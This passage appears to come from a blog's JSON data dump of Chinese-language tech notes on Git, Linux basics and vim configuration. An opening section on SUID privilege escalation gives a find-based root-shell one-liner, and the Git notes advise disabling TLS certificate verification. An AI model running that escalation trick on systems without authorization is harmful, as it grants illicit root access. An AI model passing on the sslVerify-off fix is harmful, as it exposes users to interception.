href=\"#Linux-suid-提权-Linux-suid-提权-Junsec-博客园-cnblogs-com-https-www-cnblogs-com-junsec-p-11652723-html-text-Linux-suid-提权-SUID-S-et-owner-在-Linux-2FUnix中，当一个程序运行的时候，-程序将从登录用户处继承权限。-SUID被定义为给予一个用户临时的（程序-2F文件）所有者的权限来运行一个程序-2F文件-。-用户在执行程序-2F文件-2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。-查找suid文件-3F\" class=\"headerlink\" title=\"[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))\"></a>[Linux suid 提权]([Linux suid 提权 - Junsec - 博客园 (cnblogs.com)](<a href=\"https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux\">https://www.cnblogs.com/junsec/p/11652723.html#:~:text=Linux</a> suid 提权. SUID ( S et owner,在 Linux%2FUnix中，当一个程序运行的时候， 程序将从登录用户处继承权限。. SUID被定义为给予一个用户临时的（程序%2F文件）所有者的权限来运行一个程序%2F文件 。. 用户在执行程序%2F文件%2F命令的时候，将获取文件所有者的权限以及所有者的UID和GID。. 查找suid文件. %3F))</h3><p>　<strong>SUID</strong> (<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution) 是给予文件的一个特殊类型的文件权限。在 Linux/Unix中，当一个程序运行的时候， 程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件<strong>。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</strong></p>\n<ul>\n<li>查找suid文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find / -perm -u=s -type f 2&gt; /dev/null</span><br><span class=\"line\">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class=\"line\">-perm 表示搜索随后的权限``-u = s表示查找root用户拥有的文件</span><br><span class=\"line\">type表示我们正在寻找的文件类型</span><br><span class=\"line\">f 表示常规文件，而不是目录或特殊文件</span><br><span class=\"line\">2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class=\"line\">&gt;表示重定向</span><br><span class=\"line\">/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>find提权</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find -exec /bin/sh \\;</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Git&Github","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_5.jpg","top":false,"_content":"\n- Git 初始化\n\n  ```\n  # 设置github昵称\n  git config --global user.name 'mxrmiss'\n  # 设置github邮箱\n  git config --global user.email 'heroli520@outlook.com'\n  ```\n\n- git status 无法显示中文\n\n  ```\n  git config --global core.quotepath false\n  ```\n  <!--more-->\n\n- git 无法推送新文件到github仓库原因\n\n  1. 可能仓库内已经有东西了，而且使用的推送命令不对\n  2. 或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的\n  3. 强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失\n\n- 查看git简单配置\n\n  ```\n  git config --list\n  ```\n\n- 是git无密向github传输文件\n\n  1. 终端输入ssh-keygen, 之后不断按回车\n  2. 会产生一对公密和私密，存储在家目录下的 .ssh 目录中\n  3. cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存\n  4. ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功\n  5. 以后clone仓库地址时就可以直接使用\n  \n- 向仓库更新文件基本命令\n\n```\ngit status\ngit add *\ngit commit -m \"内容描述\"\ngit push\n```\n\n\n\n- 无法读取远程仓库\n\n  删除blog文件夹下的隐藏文件 .deploy_git\n\n```\nfatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。\n```\n\n### git clonne\n\n1. fatal: unable to access ‘https://XXX: Failed onnect to github. com port 443: Timed out\n\n- 解决方法\n\n```\ngit config --global --unset http.proxy\n```\n\n2. failed to receive handshake, SSL/TLS connection failed\n\n- 解决方法\n\n```\ngit config --global http.sslBackend \"openssl\"\n```\n\n3. [OpenSSL SSL_read: Connection was reset, errno 10054](https://www.cnblogs.com/jfen625/p/12995408.html)\n\n- 解决方法\n\n```\ngit config --global http.sslVerify \"false\"\n```\n\n\n\n","source":"_posts/Git.md","raw":"---\ntitle: Git&Github\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_5.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: git\ntags: [git,github]   # 可以是数组\ntop: false\n---\n\n- Git 初始化\n\n  ```\n  # 设置github昵称\n  git config --global user.name 'mxrmiss'\n  # 设置github邮箱\n  git config --global user.email 'heroli520@outlook.com'\n  ```\n\n- git status 无法显示中文\n\n  ```\n  git config --global core.quotepath false\n  ```\n  <!--more-->\n\n- git 无法推送新文件到github仓库原因\n\n  1. 可能仓库内已经有东西了，而且使用的推送命令不对\n  2. 或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的\n  3. 强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失\n\n- 查看git简单配置\n\n  ```\n  git config --list\n  ```\n\n- 是git无密向github传输文件\n\n  1. 终端输入ssh-keygen, 之后不断按回车\n  2. 会产生一对公密和私密，存储在家目录下的 .ssh 目录中\n  3. cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存\n  4. ssh -T git@github.com #打开git bash输入此命令，显示successful表示成功\n  5. 以后clone仓库地址时就可以直接使用\n  \n- 向仓库更新文件基本命令\n\n```\ngit status\ngit add *\ngit commit -m \"内容描述\"\ngit push\n```\n\n\n\n- 无法读取远程仓库\n\n  删除blog文件夹下的隐藏文件 .deploy_git\n\n```\nfatal: 无法读取远程仓库。\n\n请确认您有正确的访问权限并且仓库存在。\n```\n\n### git clonne\n\n1. fatal: unable to access ‘https://XXX: Failed onnect to github. com port 443: Timed out\n\n- 解决方法\n\n```\ngit config --global --unset http.proxy\n```\n\n2. failed to receive handshake, SSL/TLS connection failed\n\n- 解决方法\n\n```\ngit config --global http.sslBackend \"openssl\"\n```\n\n3. [OpenSSL SSL_read: Connection was reset, errno 10054](https://www.cnblogs.com/jfen625/p/12995408.html)\n\n- 解决方法\n\n```\ngit config --global http.sslVerify \"false\"\n```\n\n\n\n","slug":"Git","published":1,"updated":"2021-06-20T02:48:22.527Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxe00037vvt3u1kddpe","content":"<ul>\n<li><p>Git 初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置github昵称</span><br><span class=\"line\">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class=\"line\"># 设置github邮箱</span><br><span class=\"line\">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure></li>\n<li><p>git status 无法显示中文</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global core.quotepath false</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span></li>\n<li><p>git 无法推送新文件到github仓库原因</p>\n<ol>\n<li>可能仓库内已经有东西了，而且使用的推送命令不对</li>\n<li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li>\n<li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li>\n</ol>\n</li>\n<li><p>查看git简单配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --list</span><br></pre></td></tr></table></figure></li>\n<li><p>是git无密向github传输文件</p>\n<ol>\n<li>终端输入ssh-keygen, 之后不断按回车</li>\n<li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li>\n<li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li>\n<li>ssh -T <a href=\"mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;\">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a> #打开git bash输入此命令，显示successful表示成功</li>\n<li>以后clone仓库地址时就可以直接使用</li>\n</ol>\n</li>\n<li><p>向仓库更新文件基本命令</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git status</span><br><span class=\"line\">git add *</span><br><span class=\"line\">git commit -m &quot;内容描述&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p>无法读取远程仓库</p>\n<p>删除blog文件夹下的隐藏文件 .deploy_git</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fatal: 无法读取远程仓库。</span><br><span class=\"line\"></span><br><span class=\"line\">请确认您有正确的访问权限并且仓库存在。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"git-clonne\"><a href=\"#git-clonne\" class=\"headerlink\" title=\"git clonne\"></a>git clonne</h3><ol>\n<li>fatal: unable to access ‘<a href=\"https://xxx/\">https://XXX</a>: Failed onnect to github. com port 443: Timed out</li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>failed to receive handshake, SSL/TLS connection failed</li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global http.sslBackend &quot;openssl&quot;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><a href=\"https://www.cnblogs.com/jfen625/p/12995408.html\">OpenSSL SSL_read: Connection was reset, errno 10054</a></li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global http.sslVerify &quot;false&quot;</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<ul>\n<li><p>Git 初始化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置github昵称</span><br><span class=\"line\">git config --global user.name &#x27;mxrmiss&#x27;</span><br><span class=\"line\"># 设置github邮箱</span><br><span class=\"line\">git config --global user.email &#x27;heroli520@outlook.com&#x27;</span><br></pre></td></tr></table></figure></li>\n<li><p>git status 无法显示中文</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global core.quotepath false</span><br></pre></td></tr></table></figure>","more":"</li>\n<li><p>git 无法推送新文件到github仓库原因</p>\n<ol>\n<li>可能仓库内已经有东西了，而且使用的推送命令不对</li>\n<li>或是原来的仓库内的东西是通过网页进行上传的， 而不还是通过命令行进行上传的</li>\n<li>强制使用命令  “git commit 文件 +mster” 可能会使原仓库内的东西丢失</li>\n</ol>\n</li>\n<li><p>查看git简单配置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --list</span><br></pre></td></tr></table></figure></li>\n<li><p>是git无密向github传输文件</p>\n<ol>\n<li>终端输入ssh-keygen, 之后不断按回车</li>\n<li>会产生一对公密和私密，存储在家目录下的 .ssh 目录中</li>\n<li>cat ～/.ssh/id_rsa.pub ，复制输出的公密内容至 github个人主页setting中的ssh中，并保存</li>\n<li>ssh -T <a href=\"mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;\">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a> #打开git bash输入此命令，显示successful表示成功</li>\n<li>以后clone仓库地址时就可以直接使用</li>\n</ol>\n</li>\n<li><p>向仓库更新文件基本命令</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git status</span><br><span class=\"line\">git add *</span><br><span class=\"line\">git commit -m &quot;内容描述&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li><p>无法读取远程仓库</p>\n<p>删除blog文件夹下的隐藏文件 .deploy_git</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fatal: 无法读取远程仓库。</span><br><span class=\"line\"></span><br><span class=\"line\">请确认您有正确的访问权限并且仓库存在。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"git-clonne\"><a href=\"#git-clonne\" class=\"headerlink\" title=\"git clonne\"></a>git clonne</h3><ol>\n<li>fatal: unable to access ‘<a href=\"https://xxx/\">https://XXX</a>: Failed onnect to github. com port 443: Timed out</li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>failed to receive handshake, SSL/TLS connection failed</li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global http.sslBackend &quot;openssl&quot;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><a href=\"https://www.cnblogs.com/jfen625/p/12995408.html\">OpenSSL SSL_read: Connection was reset, errno 10054</a></li>\n</ol>\n<ul>\n<li>解决方法</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global http.sslVerify &quot;false&quot;</span><br></pre></td></tr></table></figure>"},{"title":"Linux基础操作","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_10.jpg","top":false,"_content":"\n[本笔记的友情链接](https://book.apeland.cn/details/189/)\n\n## 常用目录介绍\n\n1. boot    存放启动文件\n2. dev     存放设备文件\n3. etc     存放配置文件\n4. home    普通用户家目录，以/home/$username的方式存放\n5. media   移动存储自动挂载目录,以 /media/$device_name的方式来存放\n6. mnt     手动挂载目录\n7. opt     三方软件安装目录\n8. proc    内存系统文件\n9. root    管理员家目录\n10. run     里面的东西是系统运行时需要的, 不能随便删除. 但是重启的时候应该抛弃. 下次系统运行时重新生成\n11. srv     服务相关数据\n12. sys     系统文件\n13. tmp     临时文件夹\n14. usr     存放库文件、文档、命令、用户数据等\n15. var     日志存放lib     库文件\n<!--more-->\n- -echo相当于python中的print，即输出、打印的意思\n\n## linux基本命令\n### 命令[命令选项][参数]\n​    {必选项}， [可选项]\n\n1）清屏命令：clear      快捷键  ctrl+l\n2）帮助命令：man\n3）进入文件夹命令: cd  【change dir，cd理解为改变目录的意思】\n4）列出当前目录内容命令：ls   [-a -l -d ] 【list】\n5）显示主机名：hostname\n6）显示日期时间：date [-s %F]\n7）显示日历：cal\n8）计算器：bc\n9）重启命令：reboot     shutdown -r      init 6\n10）注销命令：logout\n11）关机命令：halt      shutdown -h         init 0\n12) 显示当前操作系统和机器的信息: uname\n13) 显示当前路径: pwd 【定位自己的位置】\n\n-多个命令选项可以用一个 — 拼凑在一起，若命令产生了冲突，则以排最后的为主\n-命令选项写全称时，前面加 — —\n\n\n\n- 从命令行启动图形界面的默认图片查看器\n\n  ​\t运行命令：xdg-open filename.png\n\n- 在命令行打开一个图片:\n\n   1. apt install fim\n\n   2. fim filename.png\n\n      + fim是fbi的升级版\n\n        [有关于fim的操作链接](http://www.itpro.net.cn/2019/12/linux)\n\n- apt 与apt-get 的区别：apt-get 是 apt 的子集\n\n- 更新安装包：apt upgrade\n\n\n\n### 安装内核头文件\n\n- 输入命令：apt-get install linux-headers-$(uname -r)或者直接敲apt-get install linux-headers-在这时候你按键盘上的tab键，找你本系统的头文件安装即可\n\n\n\n### 安装照相机\n\n```\nsudo apt install cheese\n```\n\n\n\n### u盘修改只读模式\n\n1. 查看U盘分区\n\n```\nsudo fdisk -l\n```\n\n2. 查看U盘的挂载点\n\n```\ndf U盘分区\n```\n\n3. 卸载原挂载的U盘\n4. 修复U盘的文件管理系统\n\n```\nsudo dosfsck -v -a [U盘分区]\n```\n\n5. 重新挂载\n\n\n\n### 蓝牙\n\n```\nsudo service bluetooth start  //打开蓝牙配适器\nsudo service bluetooth stop   //关闭蓝牙配适器\n```\n\n### 关闭进程\n\n- 有时候应用被我们1关闭了，可它还在后台运行，这就要求我们手动关闭进程\n- kill -9 进程IP    //可利用htop命令查看进程IP\n- 若没有htop，可下载\n\n```\nsudo apt install htop\n```\n\n\n\n### 卸载 IntelliJ IDEA(类似卸载可参考)\n\n1. 寻找Intellij IDEA 里面是否有uninstall.sh文件，有就能直接卸载\n2. 若没有，则在里面找说明文档，找到相关配置文件所在的目录，将IntelliJ IDEA 文件夹及其相关配置文件一起删除\n3. 可能会存在开始菜单栏里依然有图标显示的问题，\n\n```\ncd ~/.local/share/applications\n```\n\n4. 之后在applications文件夹里找到相对应的配置文件删除即可\n\n\n\n\n\n### linux换源\n\n- 进入目录  /etc/apt/\n- sudo vim source.list\n- 上网寻找适合自己的源\n\n\n\n### 关于Anaconda的安装\n\n- 在清华镜像站下载Anaconda\n\n- 安装后修改环境变量\n\n  - sudo vim /etc/profile\n\n  - 向里面写入  export PATH=$PATH:/home/balacksheep/anaconda3/bin:$PATH\n\n       \t\t\t\t\t\t%%blacksheep为用户名，应选择自己的路\t\t\t\t\t\t\t径配置环境变量\n\n- 安装后命令行使用时前面有base，代表安装成功，不需要去掉base，对使用无影响\n\n- 更换anaconda的源，以清华源举例：\n\n  - sudo vim ~/.condarc\n\n  - 向里面写入：\n\n    \n\n    ```\n    channels:\n    https://mirrors.ustc.edu.cn/anaconda/pkgs/main/\n    https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/\n    https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/\n    defaults\n    show_channel_urls: true\n    ```\n  \n  \n\n\n### 关于qq的安装问题\n\n- 在kali系统中，输入wine，系统会自动提示你wine未安装，此时按照提示给的步骤来就行了\n- 关于字体问题：qq安装好了后会发现有些字体变成了乱码，此时可以安装一些字体来解决\n\n```\napt-get install xfonts-intl-chinese\napt-get install ttf-wqy-microhei\n```\n\n- 关于QQ用wine装好后找不到的问题\n  + wine 默认被配置成home文件下的隐藏文件，cd .wine即可调出\n  + 输入~/.wine/drive_c/Program Files (x86)/Tencent/QQ/Bin\n  + 你会发现里面优QQ.exe文件，输入wine QQ 或wine QQ.exe即可调出QQ程序\n  + 为了方便，可以把QQ/Bin 放到home文件下\n\n\n\n### 关于输入法的问题\n\n- 搜狗输入法兼容性不咋地，反正安装了很多遍都不行\n- 谷歌输入法可以用，基于小企鹅输入法使用，但是也不咋地，毕竟是外国人做的中国输入法，不怎么走心\n- 推荐使用百度输入法，基于小企鹅输入法，首先上官网搜索压缩包，解压后找到安装包文件进行安装，最重要一点是安装后关机重启，重启后系统会自动帮助你进行百度输入法的一些个性化的设置，接着到输入法设置中应用百度输入法就OK了\n\n### wps字体问题\n\n- 使用wps for linux2019 时可能有些中文字体会出现乱码，原因是系统缺失相应的字体\n- 将Windows系统下的Windows目录中的Fonts文件夹复制到Linux系统中的/usr/share/fonts/目录下，再执行以下命令\n\n```\nsudo fc-cache -fv     //识别字体库\n\nfc-list :lang=zh-cn | sort    //确认是否安装\n```\n\n\n\n\n\n### 关于vmware 虚拟机安装\n\n1. 官网下载虚拟机最新版本\n2. chmod -x 下载的文件\n3. sudo bash 下载的文件\n4. 之后就可以在电脑中找到虚拟机，并进行下一步的安装操作\n\n### linux-vmware升级问题\n\n[解决 linux升级 导致VMware启动出现\"before you can run vmware workstation, serveral modules must be complied and loaded into the runing kernel\" 而无法卸载](https://www.cnblogs.com/wjshan0808/p/4110495.html)\n\n```\n# vmware-uninstall \nYou have gotten this message because you are either downgrading VMware\nWorkstation, Player, or VIX, or because you attempted to run either\nvmware-uninstall or vmware-uninstall-vix.\n\nIf you are downgrading, please uninstall all newer versions first, then\ninstall again.\n\nThe vmware-uninstall* scripts have been deprecated.  Instead, please use\nthe vmware-installer.\n\nLong form:\n      vmware-installer --uninstall-product PRODUCT\nShort form:\n      vmware-installer -u PRODUCT\n\nWhere PRODUCT is one of vmware-workstation, vmware-player, or vmware-vix.\n\nFor a list of which products are installed, you may run:\n      vmware-installer --list-products\nor:\n      vmware-installer -l\n\n\n# vmware-installer -l\nProduct Name         Product Version     \n==================== ====================\nvmware-workstation   10.0.4.2249910      \n# vmware-installer -u vmware-workstation\n```\n\n\n\n### man 中文手册下载\n\n1. Debian / Ubuntu安装\n\n```\nsudo apt update\nsudo apt install manpages-zh\n```\n\n2. Arch Linux:\n\n```\npacman -Syu\npacman -S man-pages-zh_cn man-pages-zh_tw\n```\n\n3. Red Hat / CentOS:\n\n```\nyum update\nyum install man-pages-zh-CN\n```\n\n4. Fedora:\n\n```\ndnf update\ndnf install man-pages-zh-CN\n```\n\n\n\n### kali内核更新安装\n\n1. 查看内核版本\n\n```\nuname -r\n```\n\n2. 检查linux是否安装对应的头文件\n\n```\nsudo apt-cache search linux-headers\n```\n\n3. 安装更新头文件\n\n```\nsudo apt install linux-headers-$(uname -r)\n```\n\n4. 内核头文件检测是否安装\n\n```\nsudo dpkg-query -s linux-headers-`uname -r`\n```\n\n\n\n### vim命令\n\n1. :set number 显示行号\n2. :set 取消行号\n3. xG:跳转到指定的第x行，G移动到文件末尾行\n4. dd ：剪切一行， yy：复制一行\n5. D：剪切一个字符，y：复制一个字符\n6. p：粘贴\n7. dxw：删除光标右边x个字符\n8. dxh：删除光标左边x个字符\n9. :x 删除一个字符\n10. /string :查找字符 n:向上查找，N：向下查找\n11. :范围 s/oldword/newword/g  字符替换 %s全文查找，g为global，全局替换\n\n- vim规则总结\n\n（1）一般是操作字符+被操作的量\n\n（2）$ 为结尾， 0 为开头\n\n- vim简单配置：\n\n  \n\n  ```c\n  \"===================\n  \"适合自己用的vimrc配置文件\n  \"===================\n  \n  \"设置编码\n  set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936\n  set termencoding=utf-8\n  set encoding=utf-8\n  \n  \"保存.vimrc文件时自动重启加载，即让此文件立即生效\n  autocmd BufWritePost $MYVIMRC source $MYVIMRC\n  \n  \"语法高亮\n  syntax on\n  \n  \"设置ruler会在右下角显示光标所在的行号和列号,不方便查看,改成设置状态栏显示内容\n  \"set ruler\n  \n  \"设置状态行显示的内容. %F: 显示当前文件的完整路径. %r: 如果readonly,会显示[RO]\n  \"%B: 显示光标下字符的编码值,十六进制. %l:光标所在的行号. %v:光标所在的虚拟列号.\n  \"%P: 显示当前内容在整个文件中的百分比. %H和%M是strftime()函数的参数,获取时间.\n  set statusline=%F%r\\ [HEX=%B][%l,%v,%P]\\ %{strftime(\\\"%H:%M\\\")}\n  \n  \"显示行号\n  set nu \"等同于 set number\n  \n  \"突出显示当前行\n  set cursorline \"等同于 set cul\n  \n  \"突出显示当前列\n  set cursorcolumn \"等同于 set cuc\n  \n  \"共享剪贴板  \n  set clipboard+=unnamed \n  \n  \"从不备份  \n  set nobackup\n  \n  \"自动保存\n  set autowrite\n  \n  \"隐藏工具栏\n  \"set guioptions-=T\n  \"隐藏菜单栏\n  \"set guioptions-=m\n  \n  \"高亮显示所有搜索到的内容.后面用map映射快捷键来方便关闭当前搜索的高亮.\n  \"set hlsearch\n  \n  \"光标立刻跳转到搜索到内容\n  \"set incsearch\n  \n  \"搜索到最后匹配的位置后,再次搜索不回到第一个匹配处\n  \"set nowrapscan\n  \n  \"去掉输入错误时的提示声音\n  set noeb\n  \n  \" 默认按下Esc后,需要等待1秒才生效,设置Esc超时时间为100ms,尽快生效\n  set ttimeout\n  set ttimeoutlen=100\n  \n  \"在处理未保存或只读文件的时候，弹出确认\n  set confirm\n  \n  \"让Backspace键可以往前删除字符.\n  \"Debian系统自带的vim版本会加载一个debian.vim文件,默认已经设置这一项,\n  \"可以正常使用Backspace键.如果使用自己编译的vim版本,并自行配置.vimrc文件,\n  \"可能就没有设置这一项,导致Backspace键用不了,或者时灵时不灵.所以主动配置.\n  \"使回格键（backspace）正常处理indent, eol, start等\n  set backspace=indent,eol,start\n  \n  \"允许backspace和光标键跨越行边界\n  \"set whichwrap+=<,>,h,l\n  \n  \"去掉有关vi一致性模式,避免操作习惯上的局限.\n  set nocompatible\n  \n  \"FIXME 在MS-DOS控制台打开vim时,控制台使用鼠标右键来复制粘贴,设置\n  \"全鼠标模式,鼠标右键被映射为visual mode,不能用来复制粘贴,不方便.\n  \"但是如果不设置鼠标模式,会无法使用鼠标滚轮来滚动界面.经过验证,发现\n  \"可以设成普通模式mouse=n来使用鼠标滚轮,也能使用鼠标右键复制粘贴.\n  \" mouse=c/mouse=i模式都不能用鼠标滚轮. Linux下还是要设成 mouse=a\n  set mouse=n\n  \"set selection=exclusive\n  \"set selectmode=mouse,key\n  \n  \"高亮显示括号匹配\n  set showmatch\n  \n  \"设置Tab长度为4空格\n  set tabstop=4\n  \"设置自动缩进长度为4空格\n  set shiftwidth=4\n  \"自动缩进,这个导致从外面拷贝多行以空格开头的内容时,会有多的缩进,先不设置\n  \"set autoindent\n  \"不要用空格代替制表符\n  set noexpandtab\n  \"输入tab制表符时，自动替换成空格\n  \"set expandtab\n  \"设置softtabstop有一个好处是可以用Backspace键来一次删除4个空格.\n  \"softtabstop的值为负数,会使用shiftwidth的值,两者保持一致,方便统一缩进.\n  \"set softtabstop=4\n  \n  \n  \"显示空格和tab键\n  set listchars=tab:>-,trail:-\n  \n  \"1=启动显示状态行, 2=总是显示状态行.设置总是显示状态行,方便看到当前文件名\n  set laststatus=2\n  \n  \"自动补全\n  :inoremap ( ()<ESC>i\n  :inoremap ) <c-r>=ClosePair(')')<CR>\n  :inoremap { {<CR>}<ESC>O\n  :inoremap } <c-r>=ClosePair('}')<CR>\n  :inoremap [ []<ESC>i\n  :inoremap ] <c-r>=ClosePair(']')<CR>\n  :inoremap \" \"\"<ESC>i\n  :inoremap ' ''<ESC>i\n  function! ClosePair(char)\n      if getline('.')[col('.') - 1] == a:char\n          return \"\\<Right>\"\n      else\n          return a:char\n      endif\n  endfunction \n  \"打开文件类型检测,并载入文件类型插件,为特定文件类型载入相关缩进文\n  filetype plugin indent on\n  \" 设置自动补全的选项. longest表示只自动补全最大匹配的部分,剩余部分通过\n  \" CTRL-P/CTRL-N来选择匹配项进行补全. menu表示弹出可补全的内容列表.\n  \" 如果有多个匹配,longest选项不会自动选中并完整补全,要多按一次CTRL-P,比较\n  \" 麻烦,不做设置,保持默认设置,vim默认没有设置longest.\n  \"set completeopt=longest,menu \"启用这句才会开启自动补全\n  \n  \n  \"=============显示中文帮助\n  if version >= 603\n      set helplang=cn\n      set encoding=utf-8\n  endif\n  \n  \"=============新建.c,.h,.sh,.java文件，自动插入文件头 \n  autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec \":call SetTitle()\" \n  \"\"定义函数SetTitle，自动插入文件头 \n  func SetTitle() \n      \"如果文件类型为.sh文件 \n      if 